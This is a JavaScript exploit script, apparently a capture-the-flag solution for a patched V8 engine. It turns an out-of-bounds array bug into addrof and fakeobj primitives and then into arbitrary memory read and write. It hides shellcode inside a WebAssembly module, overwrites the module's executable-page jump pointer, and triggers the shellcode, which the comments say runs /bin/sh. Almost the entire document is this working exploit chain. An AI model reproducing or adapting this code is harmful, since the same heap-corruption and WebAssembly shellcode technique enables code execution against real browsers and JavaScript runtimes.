var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

function hex(x) {
  return `0x${x.toString(16)}`;
}

var arr_float_oob = [1.1];
var temp_obj = {"A":1};
var arr_object = [temp_obj];
var arr_float = [1.1, 1.2];

arr_float_oob.oob(100);

function addrof(object) {
  arr_object[0] = object;
  let address = ftoi(arr_float_oob[9]) >> 32n;
  arr_object[0] = temp_obj;
  return address;
}

function fakeobj(addr) {
  const tmp = ftoi(arr_float_oob[9]) & 0xffffffffn;
  arr_float_oob[9] = itof(tmp + (addr << 32n));
  return arr_object[0];
}

var map_arr_float = arr_float_oob[15];

function arbitrary_addr_read(addr) {
  arr_float[0] = map_arr_float;
  arr_float[1] = itof(0x0000000200000000n + addr - 0x8n);
  const fake = fakeobj(addrof(arr_float) - 0x10n);
  return ftoi(fake[0]);
}

function arbitrary_addr_write(addr, val) {
  arr_float[0] = map_arr_float;
  arr_float[1] = itof(0x0000000200000000n + addr - 0x8n);
  const fake = fakeobj(addrof(arr_float) - 0x10n);
  fake[0] = val;
}

function arbitrary_addr_read_check(){
  let arr_float_test = [1.1, 2.2];                    // 0x3ff199999999999a, 0x400199999999999a
  let test_addr = addrof(arr_float_test);

  let val_1 = arbitrary_addr_read(test_addr-0x10n);    // should equal to 0x3ff199999999999a
  let val_2 = arbitrary_addr_read(test_addr-0x8n);     // should equal to 0x400199999999999a
  console.log("[+] Read value1:" + hex(val_1));
  console.log("[+] Read value2:" + hex(val_2));

  if (val_1 === 0x3ff199999999999an && val_2 === 0x400199999999999an){
    console.log("[+] Arbitrary address read success!");
  }
}

function arbitrary_addr_write_check(){
  let arr_float_test = [1.1, 2.2];                    // change 1.1 to 3.3, 2.2 to 4.4
  let test_addr = addrof(arr_float_test);
  
  arbitrary_addr_write(test_addr-0x10n, 3.3);
  arbitrary_addr_write(test_addr-0x8n, 4.4);

  let val_1 = arbitrary_addr_read(test_addr-0x10n);    // should equal to 0x400a666666666666
  let val_2 = arbitrary_addr_read(test_addr-0x8n);     // should equal to 0x401199999999999a
  console.log("[+] Read value1:" + hex(val_1));
  console.log("[+] Read value2:" + hex(val_2));

  if (val_1 === 0x400a666666666666n && val_2 === 0x401199999999999an){
    console.log("[+] Arbitrary address write success!");
  }
}

/* The first time you call a function from wasm, v8 jits the wasm code and does NOT call the rwx page
 * However, on the second function call, the wasm code has alreayd been jitted, and modifying the rwx page
 * does work! Here we use the usual code technique, smuggling the shellcode as long sequences of move instructions */
var wasm_code = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 3, 2, 0, 0, 5, 3, 1, 0, 1,
  7, 19, 2, 7, 116, 114, 105, 103, 103, 101, 114, 0, 0, 5, 115, 104, 101, 108,
  108, 0, 1, 10, 99, 2, 3, 0, 1, 11, 93, 0, 65, 0, 66, 212, 188, 197, 249, 143,
  146, 228, 245, 16, 55, 3, 0, 65, 8, 66, 186, 161, 128, 128, 128, 128, 228,
  245, 6, 55, 3, 0, 65, 16, 66, 177, 128, 191, 168, 128, 146, 228, 245, 6, 55,
  3, 0, 65, 24, 66, 184, 247, 128, 128, 128, 128, 228, 245, 6, 55, 3, 0, 65, 32,
  66, 212, 190, 197, 177, 159, 198, 244, 245, 6, 55, 3, 0, 65, 40, 66, 143, 138,
  172, 247, 143, 146, 164, 200, 144, 127, 55, 3, 0, 11,
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var shell = wasm_instance.exports.shell;
var trigger = wasm_instance.exports.trigger;

/* Trigger jit compiler */
shell();

/* Get address of rwx page, and overwrite it with the offset to our smuggled shellcode */
var rwx_page_addr = arbitrary_addr_read(addrof(wasm_instance)+0x50n);
console.log("[+] RWX Wasm page addr: 0x" + rwx_page_addr.toString(16));
console.log("[+] Overwriting the JUMP Table pointer to: 0x" + (rwx_page_addr + 0x75dn).toString(16));
arbitrary_addr_write(addrof(wasm_instance)+0x50n, itof(rwx_page_addr + 0x75dn));

/* Shellcode from @unvariant reads from stdin the command, therefore solve.py sends /bin/sh\x00
 * NOTE: read does not appear to block, send /bin/sh\x00 BEFORE it reads (aka when console.log is executed) */
console.log("SEND");
trigger();